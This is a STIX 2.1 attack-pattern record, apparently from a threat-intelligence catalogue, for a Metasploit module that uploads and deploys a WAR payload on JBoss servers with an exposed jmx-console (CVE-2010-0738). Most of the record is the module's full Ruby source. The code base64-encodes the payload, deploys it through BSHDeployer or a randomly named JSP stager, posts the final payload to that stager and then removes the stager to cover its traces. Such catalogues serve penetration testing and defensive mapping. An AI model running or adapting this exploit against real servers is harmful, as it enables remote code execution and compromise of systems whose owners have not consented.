{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2f6ea1de-5209-4118-aed6-3459e410c675",
    "created": "2024-08-14T16:23:10.799443Z",
    "modified": "2024-08-14T16:23:10.799447Z",
    "name": "JBoss JMX Console Beanshell Deployer WAR Upload and Deployment",
    "description": " This module can be used to install a WAR file payload on JBoss servers that have an exposed \"jmx-console\" application. The payload is put on the server by using the jboss.system:BSHDeployer's createScriptDeployment() method. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/jboss_bshdeployer.rb",
            "external_id": "jboss_bshdeployer.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.redteam-pentesting.de/en/publications/jboss/-bridging-the-gap-between-the-enterprise-and-you-or-whos-the-jboss-now"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.redhat.com/show_bug.cgi?id=574105"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::JBoss\n\n  def initialize\n    super(\n      'Name' => 'JBoss JMX Console Beanshell Deployer WAR Upload and Deployment',\n      'Description' => %q{\n        This module can be used to install a WAR file payload on JBoss servers that have\n        an exposed \"jmx-console\" application. The payload is put on the server by\n        using the jboss.system:BSHDeployer's createScriptDeployment() method.\n      },\n      'Author' => [\n        'us3r777 <us3r777[at]n0b0.so>'\n      ],\n      'References' => [\n        [ 'CVE', '2010-0738' ], # using a VERB other than GET/POST\n        [ 'OSVDB', '64171' ],\n        [ 'URL', 'https://www.redteam-pentesting.de/en/publications/jboss/-bridging-the-gap-between-the-enterprise-and-you-or-whos-the-jboss-now' ],\n        [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=574105' ]\n      ],\n      'Actions' => [\n        ['Deploy', { 'Description' => 'Create and deploy app (WAR) to deliver payload' }],\n        ['Undeploy', { 'Description' => 'Remove app (WAR) for cleanup' }]\n      ],\n      'DefaultAction' => 'Deploy',\n      'License' => BSD_LICENSE,\n    )\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('APPBASE', [ true, 'Application base name', 'payload']),\n        OptPath.new('WARFILE', [ false, 'The WAR file to deploy'])\n      ]\n    )\n  end\n\n  def deploy_action(app_base, war_data)\n    encoded_payload = Rex::Text.encode_base64(war_data).gsub(/\\n/, '')\n\n    if http_verb == 'POST'\n      print_status('Deploying payload...')\n      opts = {\n        file: \"#{app_base}.war\",\n        contents: encoded_payload\n      }\n    else\n      print_status('Deploying stager...')\n      stager_name = Rex::Text.rand_text_alpha(rand(8..15))\n      stager_contents = stager_jsp(app_base)\n      opts = {\n        dir: \"#{stager_name}.war\",\n        file: \"#{stager_name}.war/#{stager_name}.jsp\",\n        contents: Rex::Text.encode_base64(stager_contents).gsub(/\\n/, '')\n      }\n    end\n\n    bsh_payload = generate_bsh(:create, opts)\n    package = deploy_bsh(bsh_payload)\n\n    if package.nil?\n      print_error('Deployment failed')\n      return\n    else\n      print_good('Deployment successful')\n    end\n\n    unless http_verb == 'POST'\n      # call the stager to deploy our real payload war\n      stager_uri = '/' + stager_name + '/' + stager_name + '.jsp'\n      payload_data = \"#{Rex::Text.rand_text_alpha(rand(8..15))}=#{Rex::Text.uri_encode(encoded_payload)}\"\n      print_status(\"Calling stager #{stager_uri} to deploy final payload...\")\n      res = deploy('method' => 'POST',\n                   'data' => payload_data,\n                   'uri' => stager_uri)\n      if res && res.code == 200\n        print_good('Payload deployed')\n      else\n        print_error('Failed to deploy final payload')\n      end\n\n      # Remove the stager\n      print_status('Removing stager...')\n      files = {}\n      files[:stager_jsp_name] = \"#{stager_name}.war/#{stager_name}.jsp\"\n      files[:stager_base] = \"#{stager_name}.war\"\n      delete_script = generate_bsh(:delete, files)\n      res = deploy_package(delete_script, package)\n      if res.nil?\n        print_error('Unable to remove Stager')\n      else\n        print_good('Stager successfully removed')\n      end\n    end\n  end\n\n  def undeploy_action(app_base)\n    # Undeploy the WAR and the stager if needed\n    print_status(\"Undeploying #{app_base} by deleting the WAR file via BSHDeployer...\")\n\n    files = {}\n    files[:app_base] = \"#{app_base}.war\"\n    delete_script = generate_bsh(:delete, files)\n\n    package = deploy_bsh(delete_script)\n    if package.nil?\n      print_error('Unable to remove WAR')\n    else\n      print_good('Successfully removed')\n    end\n  end\n\n  def run\n    app_base = datastore['APPBASE']\n\n    case action.name\n    when 'Deploy'\n      unless datastore['WARFILE'] && File.exist?(datastore['WARFILE'])\n        print_error('WAR file not found')\n        return\n      end\n      war_data = File.read(datastore['WARFILE'], mode: 'rb')\n      deploy_action(app_base, war_data)\n    when 'Undeploy'\n      undeploy_action(app_base)\n    end\n  end\nend\n"
}